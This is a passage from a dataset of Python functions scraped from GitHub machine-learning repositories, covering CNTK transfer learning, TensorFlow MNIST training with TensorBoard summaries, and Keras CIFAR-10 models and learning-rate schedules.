        transforms += [xforms.scale(width=2 * image_width, height=2 * image_height, channels=num_channels, interpolations='linear', scale_mode='pad', pad_value=114)]
        transforms += [xforms.crop(crop_type='randomside', side_ratio=0.9, jitter_type='uniratio')]
    transforms += [xforms.scale(width=image_width, height=image_height, channels=num_channels, interpolations='linear', scale_mode='pad', pad_value=114)]
    if boTrain:
        transforms += [xforms.color(brightness_radius=0.2, contrast_radius=0.2, saturation_radius=0.2)]
    return MinibatchSource(ImageDeserializer(map_file, StreamDefs(features=StreamDef(field='image', transforms=transforms), labels=StreamDef(field='label', shape=num_classes))), randomize=boTrain, multithreaded_deserializer=True)"
Azure/ImageSimilarityUsingCntk,create_model,"def create_model(base_model_file, input_features, num_classes, dropout_rate=0.5, freeze_weights=False):
    base_model = load_model(base_model_file)
    feature_node = find_by_name(base_model, 'features')
    beforePooling_node = find_by_name(base_model, 'z.x.x.r')
    modelCloned = combine([beforePooling_node.owner]).clone(CloneMethod.freeze if freeze_weights else CloneMethod.clone, {feature_node: placeholder(name='features')})
    feat_norm = input_features - constant(114)
    model = modelCloned(feat_norm)
    avgPool = GlobalAveragePooling(name='poolingLayer')(model)
    if dropout_rate > 0:
        avgPoolDrop = Dropout(dropout_rate)(avgPool)
    else:
        avgPoolDrop = avgPool
    finalModel = Dense(num_classes, activation=None, name='prediction')(avgPoolDrop)
    return finalModel"
Azure/ImageSimilarityUsingCntk,train_model,"def train_model(base_model_file, train_map_file, test_map_file, input_resolution, num_epochs, mb_size, max_train_images, lr_per_mb, momentum_per_mb, l2_reg_weight, dropout_rate, freeze_weights, num_channels=3):
    image_width = input_resolution
    image_height = input_resolution
    epoch_size_test = len(readTable(test_map_file))
    epoch_size_train = len(readTable(train_map_file))
    epoch_size_train = min(epoch_size_train, max_train_images)
    num_classes = max(ToIntegers(getColumn(readTable(train_map_file), 1)) + ToIntegers(getColumn(readTable(test_map_file), 1))) + 1
    minibatch_source_train = create_mb_source(train_map_file, image_width, image_height, num_channels, num_classes, True)
    minibatch_source_test = create_mb_source(test_map_file, image_width, image_height, num_channels, num_classes, False)
    label_input = input_variable(num_classes)
    image_input = input_variable((num_channels, image_height, image_width), name='input')
    input_map = {image_input: minibatch_source_train['features'], label_input: minibatch_source_train['labels']}
    cntkModel = create_model(base_model_file, image_input, num_classes, dropout_rate, freeze_weights)
    ce = cross_entropy_with_softmax(cntkModel, label_input)
    pe = classification_error(cntkModel, label_input)
    lr_schedule = learning_rate_schedule(lr_per_mb, unit=UnitType.minibatch)
    mm_schedule = momentum_schedule(momentum_per_mb)
    learner = momentum_sgd(cntkModel.parameters, lr_schedule, mm_schedule, l2_regularization_weight=l2_reg_weight)
    progress_writers = [ProgressPrinter(tag='Training', num_epochs=num_epochs)]
    trainer = Trainer(cntkModel, (ce, pe), learner, progress_writers)
    print('Training transfer learning model for {0} epochs (epoch_size_train = {1}).'.format(num_epochs, epoch_size_train))
    errsTest = []
    errsTrain = []
    log_number_of_parameters(cntkModel)
    for epoch in range(num_epochs):
        err_numer = 0
        sample_counts = 0
        while sample_counts < epoch_size_train:
            sample_count = min(mb_size, epoch_size_train - sample_counts)
            data = minibatch_source_train.next_minibatch(sample_count, input_map=input_map)
            trainer.train_minibatch(data)
            sample_counts += sample_count
            err_numer += trainer.previous_minibatch_evaluation_average * sample_count
            if sample_counts % (100 * mb_size) == 0:
                print('Training: processed {0} samples'.format(sample_counts))
        errsTrain.append(err_numer / float(sample_counts))
        trainer.summarize_training_progress()
        errsTest.append(cntkComputeTestError(trainer, minibatch_source_test, mb_size, epoch_size_test, input_map))
        trainer.summarize_test_progress()
        plt.plot(errsTrain, 'b-', errsTest, 'g-')
        plt.xlabel('Epoch number')
        plt.ylabel('Error')
        plt.title('Training error (blue), test error (green)')
        plt.draw()
    return cntkModel"
Azure/ImageSimilarityUsingCntk,cntkComputeTestError,"def cntkComputeTestError(trainer, minibatch_source_test, mb_size, epoch_size, input_map):
    acc_numer = 0
    sample_counts = 0
    while sample_counts < epoch_size:
        sample_count = min(mb_size, epoch_size - sample_counts)
        data = minibatch_source_test.next_minibatch(sample_count, input_map=input_map)
        acc_numer += trainer.test_minibatch(data) * sample_count
        sample_counts += sample_count
    return acc_numer / float(sample_counts)"
Azure/ImageSimilarityUsingCntk,runCntkModel,"def runCntkModel(model, map_file, node_name=[], mb_size=1):
    num_classes = model.shape[0]
    (image_width, image_height) = find_by_name(model, 'input').shape[1:]
    minibatch_source = create_mb_source(map_file, image_width, image_height, 3, num_classes, False)
    features_si = minibatch_source['features']
    if node_name == []:
        output_node = model
    else:
        node_in_graph = model.find_by_name(node_name)
        output_node = combine([node_in_graph.owner])
    data = []
    sample_counts = 0
    imgPaths = getColumn(readTable(map_file), 0)
    while sample_counts < len(imgPaths):
        sample_count = min(mb_size, len(imgPaths) - sample_counts)
        mb = minibatch_source.next_minibatch(sample_count)
        output = output_node.eval(mb[features_si])
        data += [o.flatten() for o in output]
        sample_counts += sample_count
        if sample_counts % 100 < mb_size:
            print('Evaluating DNN (output dimension = {}) for image {} of {}: {}'.format(len(data[-1]), sample_counts, len(imgPaths), imgPaths[sample_counts - 1]))
    data = [[imgPath, feat] for (imgPath, feat) in zip(imgPaths, data)]
    return data"
Azure/ImageSimilarityUsingCntk,featurizeImages,"def featurizeImages(model, imgFilenamesPath, imgDir, map_file, node_name=[], mb_size=1):
    imgFilenames = loadFromPickle(imgFilenamesPath)
    imgLabelMap = getImgLabelMap(imgFilenames, imgDir)
    imgLabelMap = zip(getColumn(imgLabelMap, 0), [0] * len(imgLabelMap))
    writeTable(map_file, imgLabelMap)
    cntkOutput = runCntkModel(model, map_file, node_name)
    features = dict()
    for (imgPath, feat) in cntkOutput:
        imgFilename = os.path.basename(imgPath)
        imgSubdir = os.path.split(os.path.split(imgPath)[0])[1]
        key = imgSubdir + '/' + imgFilename
        features[key] = feat
    return features"
Azure/kubeflow-labs,train,"def train():
    mnist = input_data.read_data_sets(FLAGS.data_dir, one_hot=True, fake_data=FLAGS.fake_data)
    with tf.name_scope('input'):
        x = tf.placeholder(tf.float32, [None, 784], name='x-input')
        y_ = tf.placeholder(tf.float32, [None, 10], name='y-input')
    with tf.name_scope('input_reshape'):
        image_shaped_input = tf.reshape(x, [-1, 28, 28, 1])
        tf.summary.image('input', image_shaped_input, 10)

    def weight_variable(shape):
        """"""Create a weight variable with appropriate initialization.""""""
        initial = tf.truncated_normal(shape, stddev=0.1)
        return tf.Variable(initial)

    def bias_variable(shape):
        """"""Create a bias variable with appropriate initialization.""""""
        initial = tf.constant(0.1, shape=shape)
        return tf.Variable(initial)

    def variable_summaries(var):
        """"""Attach a lot of summaries to a Tensor (for TensorBoard visualization).""""""
        with tf.name_scope('summaries'):
            mean = tf.reduce_mean(var)
            tf.summary.scalar('mean', mean)
            with tf.name_scope('stddev'):
                stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))
            tf.summary.scalar('stddev', stddev)
            tf.summary.scalar('max', tf.reduce_max(var))
            tf.summary.scalar('min', tf.reduce_min(var))
            tf.summary.histogram('histogram', var)

    def nn_layer(input_tensor, input_dim, output_dim, layer_name, act=tf.nn.relu):
        """"""Reusable code for making a simple neural net layer.

    It does a matrix multiply, bias add, and then uses ReLU to nonlinearize.
    It also sets up name scoping so that the resultant graph is easy to read,
    and adds a number of summary ops.
    """"""
        with tf.name_scope(layer_name):
            with tf.name_scope('weights'):
                weights = weight_variable([input_dim, output_dim])
                variable_summaries(weights)
            with tf.name_scope('biases'):
                biases = bias_variable([output_dim])
                variable_summaries(biases)
            with tf.name_scope('Wx_plus_b'):
                preactivate = tf.matmul(input_tensor, weights) + biases
                tf.summary.histogram('pre_activations', preactivate)
            activations = act(preactivate, name='activation')
            tf.summary.histogram('activations', activations)
            return activations
    hidden1 = nn_layer(x, 784, 500, 'layer1')
    with tf.name_scope('dropout'):
        keep_prob = tf.placeholder(tf.float32)
        tf.summary.scalar('dropout_keep_probability', keep_prob)
        dropped = tf.nn.dropout(hidden1, keep_prob)
    y = nn_layer(dropped, 500, 10, 'layer2', act=tf.identity)
    with tf.name_scope('cross_entropy'):
        diff = tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=y)
        with tf.name_scope('total'):
            cross_entropy = tf.reduce_mean(diff)
    tf.summary.scalar('cross_entropy', cross_entropy)
    with tf.name_scope('train'):
        train_step = tf.train.AdamOptimizer(FLAGS.learning_rate).minimize(cross_entropy)
    with tf.name_scope('accuracy'):
        with tf.name_scope('correct_prediction'):
            correct_prediction = tf.equal(tf.argmax(y, 1), tf.argmax(y_, 1))
        with tf.name_scope('accuracy'):
            accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    tf.summary.scalar('accuracy', accuracy)
    merged = tf.summary.merge_all()

    def feed_dict(train):
        """"""Make a TensorFlow feed_dict: maps data onto Tensor placeholders.""""""
        if train or FLAGS.fake_data:
            (xs, ys) = mnist.train.next_batch(100, fake_data=FLAGS.fake_data)
            k = FLAGS.dropout
        else:
            (xs, ys) = (mnist.test.images, mnist.test.labels)
            k = 1.0
        return {x: xs, y_: ys, keep_prob: k}
    sess = tf.InteractiveSession()
    train_writer = tf.summary.FileWriter(FLAGS.log_dir + '/train', sess.graph)
    test_writer = tf.summary.FileWriter(FLAGS.log_dir + '/test')
    tf.global_variables_initializer().run()
    for i in range(FLAGS.max_steps):
        if i % 10 == 0:
            (summary, acc) = sess.run([merged, accuracy], feed_dict=feed_dict(False))
            test_writer.add_summary(summary, i)
            print('Accuracy at step %s: %s' % (i, acc))
        elif i % 100 == 99:
            run_options = tf.RunOptions(trace_level=tf.RunOptions.FULL_TRACE)
            run_metadata = tf.RunMetadata()
            (summary, _) = sess.run([merged, train_step], feed_dict=feed_dict(True), options=run_options, run_metadata=run_metadata)
            train_writer.add_run_metadata(run_metadata, 'step%03d' % i)
            train_writer.add_summary(summary, i)
            print('Adding run metadata for', i)
        else:
            (summary, _) = sess.run([merged, train_step], feed_dict=feed_dict(True))
            train_writer.add_summary(summary, i)
    train_writer.close()
    test_writer.close()"
Azure/kubeflow-labs,main,"def main(_):
    train()"
Azure/kubeflow-labs,weight_variable,"def weight_variable(shape):
    """"""Create a weight variable with appropriate initialization.""""""
    initial = tf.truncated_normal(shape, stddev=0.1)
    return tf.Variable(initial)"
Azure/kubeflow-labs,bias_variable,"def bias_variable(shape):
    """"""Create a bias variable with appropriate initialization.""""""
    initial = tf.constant(0.1, shape=shape)
    return tf.Variable(initial)"
Azure/kubeflow-labs,variable_summaries,"def variable_summaries(var):
    """"""Attach a lot of summaries to a Tensor (for TensorBoard visualization).""""""
    with tf.name_scope('summaries'):
        mean = tf.reduce_mean(var)
        tf.summary.scalar('mean', mean)
        with tf.name_scope('stddev'):
            stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))
        tf.summary.scalar('stddev', stddev)
        tf.summary.scalar('max', tf.reduce_max(var))
        tf.summary.scalar('min', tf.reduce_min(var))
        tf.summary.histogram('histogram', var)"
Azure/kubeflow-labs,nn_layer,"def nn_layer(input_tensor, input_dim, output_dim, layer_name, act=tf.nn.relu):
    """"""Reusable code for making a simple neural net layer.

    It does a matrix multiply, bias add, and then uses ReLU to nonlinearize.
    It also sets up name scoping so that the resultant graph is easy to read,
    and adds a number of summary ops.
    """"""
    with tf.name_scope(layer_name):
        with tf.name_scope('weights'):
            weights = weight_variable([input_dim, output_dim])
            variable_summaries(weights)
        with tf.name_scope('biases'):
            biases = bias_variable([output_dim])
            variable_summaries(biases)
        with tf.name_scope('Wx_plus_b'):
            preactivate = tf.matmul(input_tensor, weights) + biases
            tf.summary.histogram('pre_activations', preactivate)
        activations = act(preactivate, name='activation')
        tf.summary.histogram('activations', activations)
        return activations"
Azure/kubeflow-labs,feed_dict,"def feed_dict(train):
    """"""Make a TensorFlow feed_dict: maps data onto Tensor placeholders.""""""
    if train or FLAGS.fake_data:
        (xs, ys) = mnist.train.next_batch(100, fake_data=FLAGS.fake_data)
        k = FLAGS.dropout
    else:
        (xs, ys) = (mnist.test.images, mnist.test.labels)
        k = 1.0
    return {x: xs, y_: ys, keep_prob: k}"
Azure/kubeflow-labs,train,"def train():
    tf_config_json = os.environ.get('TF_CONFIG', '{}')
    tf_config = json.loads(tf_config_json)
    task = tf_config.get('task', {})
    cluster_spec = tf_config.get('cluster', {})
    cluster_spec_object = tf.train.ClusterSpec(cluster_spec)
    job_name = task['type']
    task_id = task['index']
    server_def = tf.train.ServerDef(cluster=cluster_spec_object.as_cluster_def(), protocol='grpc', job_name=job_name, task_index=task_id)
    server = tf.train.Server(server_def)
    is_chief = job_name == 'master'
    mnist = input_data.read_data_sets(FLAGS.data_dir, one_hot=True, fake_data=FLAGS.fake_data)
    with tf.device(tf.train.replica_device_setter(worker_device='/job:worker/task:%d' % task_id, cluster=cluster_spec)):
        global_step = tf.get_variable('global_step', [], initializer=tf.constant_initializer(0), trainable=False)
        with tf.name_scope('input'):
            x = tf.placeholder(tf.float32, [None, 784], name='x-input')
            y_ = tf.placeholder(tf.float32, [None, 10], name='y-input')
        with tf.name_scope('input_reshape'):
            image_shaped_input = tf.reshape(x, [-1, 28, 28, 1])
            tf.summary.image('input', image_shaped_input, 10)

        def weight_variable(shape):
            """"""Create a weight variable with appropriate initialization.""""""
            initial = tf.truncated_normal(shape, stddev=0.1)
            return tf.Variable(initial)

        def bias_variable(shape):
            """"""Create a bias variable with appropriate initialization.""""""
            initial = tf.constant(0.1, shape=shape)
            return tf.Variable(initial)

        def variable_summaries(var):
            """"""Attach a lot of summaries to a Tensor (for TensorBoard visualization).""""""
            with tf.name_scope('summaries'):
                mean = tf.reduce_mean(var)
                tf.summary.scalar('mean', mean)
                with tf.name_scope('stddev'):
                    stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))
                tf.summary.scalar('stddev', stddev)
                tf.summary.scalar('max', tf.reduce_max(var))
                tf.summary.scalar('min', tf.reduce_min(var))
                tf.summary.histogram('histogram', var)

        def nn_layer(input_tensor, input_dim, output_dim, layer_name, act=tf.nn.relu):
            """"""Reusable code for making a simple neural net layer.

      It does a matrix multiply, bias add, and then uses ReLU to nonlinearize.
      It also sets up name scoping so that the resultant graph is easy to read,
      and adds a number of summary ops.
      """"""
            with tf.name_scope(layer_name):
                with tf.name_scope('weights'):
                    weights = weight_variable([input_dim, output_dim])
                    variable_summaries(weights)
                with tf.name_scope('biases'):
                    biases = bias_variable([output_dim])
                    variable_summaries(biases)
                with tf.name_scope('Wx_plus_b'):
                    preactivate = tf.matmul(input_tensor, weights) + biases
                    tf.summary.histogram('pre_activations', preactivate)
                activations = act(preactivate, name='activation')
                tf.summary.histogram('activations', activations)
                return activations
        hidden1 = nn_layer(x, 784, 500, 'layer1')
        with tf.name_scope('dropout'):
            keep_prob = tf.placeholder(tf.float32)
            tf.summary.scalar('dropout_keep_probability', keep_prob)
            dropped = tf.nn.dropout(hidden1, keep_prob)
        y = nn_layer(dropped, 500, 10, 'layer2', act=tf.identity)
        with tf.name_scope('cross_entropy'):
            diff = tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=y)
            with tf.name_scope('total'):
                cross_entropy = tf.reduce_mean(diff)
        tf.summary.scalar('cross_entropy', cross_entropy)
        with tf.name_scope('train'):
            train_step = tf.train.AdamOptimizer(FLAGS.learning_rate).minimize(cross_entropy)
        with tf.name_scope('accuracy'):
            with tf.name_scope('correct_prediction'):
                correct_prediction = tf.equal(tf.argmax(y, 1), tf.argmax(y_, 1))
            with tf.name_scope('accuracy'):
                accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
        tf.summary.scalar('accuracy', accuracy)
        merged = tf.summary.merge_all()
        init_op = tf.global_variables_initializer()

    def feed_dict(train):
        """"""Make a TensorFlow feed_dict: maps data onto Tensor placeholders.""""""
        if train or FLAGS.fake_data:
            (xs, ys) = mnist.train.next_batch(100, fake_data=FLAGS.fake_data)
            k = FLAGS.dropout
        else:
            (xs, ys) = (mnist.test.images, mnist.test.labels)
            k = 1.0
        return {x: xs, y_: ys, keep_prob: k}
    sv = tf.train.Supervisor(is_chief=is_chief, global_step=global_step, init_op=init_op, logdir=FLAGS.logdir)
    with sv.prepare_or_wait_for_session(server.target) as sess:
        train_writer = tf.summary.FileWriter(FLAGS.logdir + '/train', sess.graph)
        test_writer = tf.summary.FileWriter(FLAGS.logdir + '/test')
        for i in range(FLAGS.max_steps):
            if i % 10 == 0:
                (summary, acc) = sess.run([merged, accuracy], feed_dict=feed_dict(False))
                test_writer.add_summary(summary, i)
                print('Accuracy at step %s: %s' % (i, acc))
            elif i % 100 == 99:
                run_options = tf.RunOptions(trace_level=tf.RunOptions.FULL_TRACE)
                run_metadata = tf.RunMetadata()
                (summary, _) = sess.run([merged, train_step], feed_dict=feed_dict(True), options=run_options, run_metadata=run_metadata)
                train_writer.add_run_metadata(run_metadata, 'step%03d' % i)
                train_writer.add_summary(summary, i)
                print('Adding run metadata for', i)
            else:
                (summary, _) = sess.run([merged, train_step], feed_dict=feed_dict(True))
                train_writer.add_summary(summary, i)
        train_writer.close()
        test_writer.close()"
Azure/kubeflow-labs,main,"def main(_):
    train()"
Azure/kubeflow-labs,feed_dict,"def feed_dict(train):
    """"""Make a TensorFlow feed_dict: maps data onto Tensor placeholders.""""""
    if train or FLAGS.fake_data:
        (xs, ys) = mnist.train.next_batch(100, fake_data=FLAGS.fake_data)
        k = FLAGS.dropout
    else:
        (xs, ys) = (mnist.test.images, mnist.test.labels)
        k = 1.0
    return {x: xs, y_: ys, keep_prob: k}"
Azure/kubeflow-labs,weight_variable,"def weight_variable(shape):
    """"""Create a weight variable with appropriate initialization.""""""
    initial = tf.truncated_normal(shape, stddev=0.1)
    return tf.Variable(initial)"
Azure/kubeflow-labs,bias_variable,"def bias_variable(shape):
    """"""Create a bias variable with appropriate initialization.""""""
    initial = tf.constant(0.1, shape=shape)
    return tf.Variable(initial)"
Azure/kubeflow-labs,variable_summaries,"def variable_summaries(var):
    """"""Attach a lot of summaries to a Tensor (for TensorBoard visualization).""""""
    with tf.name_scope('summaries'):
        mean = tf.reduce_mean(var)
        tf.summary.scalar('mean', mean)
        with tf.name_scope('stddev'):
            stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))
        tf.summary.scalar('stddev', stddev)
        tf.summary.scalar('max', tf.reduce_max(var))
        tf.summary.scalar('min', tf.reduce_min(var))
        tf.summary.histogram('histogram', var)"
Azure/kubeflow-labs,nn_layer,"def nn_layer(input_tensor, input_dim, output_dim, layer_name, act=tf.nn.relu):
    """"""Reusable code for making a simple neural net layer.

      It does a matrix multiply, bias add, and then uses ReLU to nonlinearize.
      It also sets up name scoping so that the resultant graph is easy to read,
      and adds a number of summary ops.
      """"""
    with tf.name_scope(layer_name):
        with tf.name_scope('weights'):
            weights = weight_variable([input_dim, output_dim])
            variable_summaries(weights)
        with tf.name_scope('biases'):
            biases = bias_variable([output_dim])
            variable_summaries(biases)
        with tf.name_scope('Wx_plus_b'):
            preactivate = tf.matmul(input_tensor, weights) + biases
            tf.summary.histogram('pre_activations', preactivate)
        activations = act(preactivate, name='activation')
        tf.summary.histogram('activations', activations)
        return activations"
Azure/kubeflow-labs,linear_layer,"def linear_layer(X, layer_size, layer_name):
    with tf.variable_scope(layer_name):
        W = tf.Variable(tf.random_uniform([X.get_shape().as_list()[1], layer_size], dtype=tf.float32), name='W')
        b = tf.Variable(tf.zeros([layer_size]), name='b')
        return tf.nn.relu(tf.matmul(X, W) + b)"
Azure/kubeflow-labs,main,"@click.command()
@click.option('--learning-rate', default=0.01)
@click.option('--hidden-layers', default=7)
@click.option('--logdir')
def main(learning_rate, hidden_layers, logdir='./logs/1'):
    X = tf.placeholder(dtype=tf.float32, shape=(None, 2), name='X')
    y = tf.placeholder(dtype=tf.float32, shape=(None, 3), name='y')
    current_input = X
    for layer_id in range(hidden_layers):
        h = linear_layer(current_input, 20, 'layer{}'.format(layer_id))
        current_input = h
    y_pred = linear_layer(current_input, 3, 'output')
    loss = tf.reduce_mean(tf.reduce_sum(tf.squared_difference(y, y_pred), 1))
    tf.summary.scalar('loss', loss)
    train_op = tf.train.AdamOptimizer(learning_rate).minimize(loss)
    merged_summary_op = tf.summary.merge_all()
    res_img = tf.cast(tf.clip_by_value(tf.reshape(y_pred, (1,) + img.shape), 0, 255), tf.uint8)
    img_summary = tf.summary.image('out', res_img, max_outputs=1)
    (xs, ys) = get_data(img)
    with tf.Session() as sess:
        tf.global_variables_initializer().run()
        train_writer = tf.summary.FileWriter(logdir + '/train', sess.graph)
        test_writer = tf.summary.FileWriter(logdir + '/test')
        batch_size = 50
        for i in range(epochs):
            idxs = np.random.permutation(range(len(xs)))
            n_batches = len(idxs) // batch_size
            for batch_i in range(n_batches):
                batch_idxs = idxs[batch_i * batch_size:(batch_i + 1) * batch_size]
                sess.run([train_op, loss, merged_summary_op], feed_dict={X: xs[batch_idxs], y: ys[batch_idxs]})
                if batch_i % 100 == 0:
                    (c, summary) = sess.run([loss, merged_summary_op], feed_dict={X: xs[batch_idxs], y: ys[batch_idxs]})
                    train_writer.add_summary(summary, i * n_batches * batch_size + batch_i)
                    print('epoch {}, (l2) loss {}'.format(i, c))
            if i % 10 == 0:
                img_summary_res = sess.run(img_summary, feed_dict={X: xs, y: ys})
                test_writer.add_summary(img_summary_res, i * n_batches * batch_size)"
Azure/kubeflow-labs,get_data,"def get_data(img):
    xs = []
    ys = []
    for row_i in range(img.shape[0]):
        for col_i in range(img.shape[1]):
            xs.append([row_i, col_i])
            ys.append(img[row_i, col_i])
    xs = (xs - np.mean(xs)) / np.std(xs)
    return (xs, np.array(ys))"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 100:
        return 0.01
    if epoch < 150:
        return 0.005
    return 0.001"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', kernel_regularizer=l2(weight_decay), input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', kernel_regularizer=l2(weight_decay)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal', kernel_regularizer=l2(weight_decay)))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal', kernel_regularizer=l2(weight_decay)))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal', kernel_regularizer=l2(weight_decay)))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 100:
        return 0.01
    if epoch < 150:
        return 0.005
    return 0.001"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 100:
        return 0.01
    if epoch < 150:
        return 0.005
    return 0.001"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(6, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal', input_shape=(32, 32, 3)))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Conv2D(16, (5, 5), padding='valid', activation='relu', kernel_initializer='he_normal'))
    model.add(MaxPooling2D((2, 2), strides=(2, 2)))
    model.add(Flatten())
    model.add(Dense(120, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(84, activation='relu', kernel_initializer='he_normal'))
    model.add(Dense(10, activation='softmax', kernel_initializer='he_normal'))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch < 100:
        return 0.01
    if epoch < 150:
        return 0.005
    return 0.001"
BIGBALLON/cifar-10-cnn,color_preprocessing,"def color_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    mean = [125.307, 122.95, 113.865]
    std = [62.9932, 62.0887, 66.7048]
    for i in range(3):
        x_train[:, :, :, i] = (x_train[:, :, :, i] - mean[i]) / std[i]
        x_test[:, :, :, i] = (x_test[:, :, :, i] - mean[i]) / std[i]
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch <= 60:
        return 0.05
    if epoch <= 120:
        return 0.01
    if epoch <= 160:
        return 0.002
    return 0.0004"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(192, (5, 5), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay), input_shape=x_train.shape[1:]))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(160, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(96, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2), padding='same'))
    model.add(Dropout(dropout))
    model.add(Conv2D(192, (5, 5), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2), padding='same'))
    model.add(Dropout(dropout))
    model.add(Conv2D(192, (3, 3), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(Conv2D(10, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(BatchNormalization())
    model.add(Activation('relu'))
    model.add(GlobalAveragePooling2D())
    model.add(Activation('softmax'))
    sgd = optimizers.SGD(lr=0.1, momentum=0.9, nesterov=True)
    model.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])
    return model"
BIGBALLON/cifar-10-cnn,color_preprocessing,"def color_preprocessing(x_train, x_test):
    x_train = x_train.astype('float32')
    x_test = x_test.astype('float32')
    mean = [125.307, 122.95, 113.865]
    std = [62.9932, 62.0887, 66.7048]
    for i in range(3):
        x_train[:, :, :, i] = (x_train[:, :, :, i] - mean[i]) / std[i]
        x_test[:, :, :, i] = (x_test[:, :, :, i] - mean[i]) / std[i]
    return (x_train, x_test)"
BIGBALLON/cifar-10-cnn,scheduler,"def scheduler(epoch):
    if epoch <= 80:
        return 0.01
    if epoch <= 140:
        return 0.005
    return 0.001"
BIGBALLON/cifar-10-cnn,build_model,"def build_model():
    model = Sequential()
    model.add(Conv2D(192, (5, 5), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay), input_shape=x_train.shape[1:]))
    model.add(Activation('relu'))
    model.add(Conv2D(160, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(Conv2D(96, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(MaxPooling2D(pool_size=(3, 3), strides=(2, 2), padding='same'))
    model.add(Dropout(dropout))
    model.add(Conv2D(192, (5, 5), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
    model.add(Conv2D(192, (1, 1), padding='same', kernel_regularizer=keras.regularizers.l2(weight_decay)))
    model.add(Activation('relu'))
